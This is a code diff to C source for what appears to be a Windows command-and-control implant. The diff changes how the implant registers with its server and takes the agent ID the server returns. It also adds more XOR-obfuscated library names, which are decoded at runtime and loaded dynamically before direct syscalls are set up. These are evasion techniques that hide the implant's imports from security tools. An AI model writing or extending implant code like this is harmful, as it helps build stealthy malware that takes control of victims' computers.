@@ -175,13 +175,16 @@ BOOL Register(){
     if (!PackageTransmit(pkg, &resp, &sz))
         return FALSE;
 
-    if (!resp || sz < 4)
+    if (!resp || sz < 4){
+        if (resp) pFree(resp);
         return FALSE;
+    }
 
     UINT32 got = *(UINT32*)resp;
     pFree(resp);
 
-    if (got == g_AgentID){
+    if (sz == 4){
+        g_AgentID  = got;
         g_Connected = TRUE;
         return TRUE;
     }
@@ -206,10 +209,15 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, INT nShow){
         UCHAR s1[] = { 0xF8,0xE6,0xE1,0xE7,0xFB,0xFB,0xFF,0xA1,0xEB,0xE3,0xE3,0x00 };
         UCHAR s2[] = { 0xE6,0xFF,0xE7,0xE3,0xFF,0xEE,0xFF,0xE6,0xA1,0xEB,0xE3,0xE3,0x00 };
         UCHAR s3[] = { 0xEE,0xEB,0xF9,0xEE,0xFF,0xE6,0xBC,0xBD,0xA1,0xEB,0xE3,0xE3,0x00 };
+        UCHAR s4[] = { 0xE1,0xEA,0xFB,0xEE,0xFF,0xE6,0xBC,0xBD,0xA1,0xEB,0xE3,0xE3,0x00 };
+        UCHAR s5[] = { 0xFF,0xFC,0xEE,0xFF,0xE6,0xA1,0xEB,0xE3,0xE3,0x00 };
         xor_dec(s1, 11); xor_dec(s2, 12); xor_dec(s3, 12);
+        xor_dec(s4, 12); xor_dec(s5, 9);
         pLoadLib((LPCSTR)s1);
         pLoadLib((LPCSTR)s2);
         pLoadLib((LPCSTR)s3);
+        pLoadLib((LPCSTR)s4);
+        pLoadLib((LPCSTR)s5);
     }
 
     InitSyscalls();
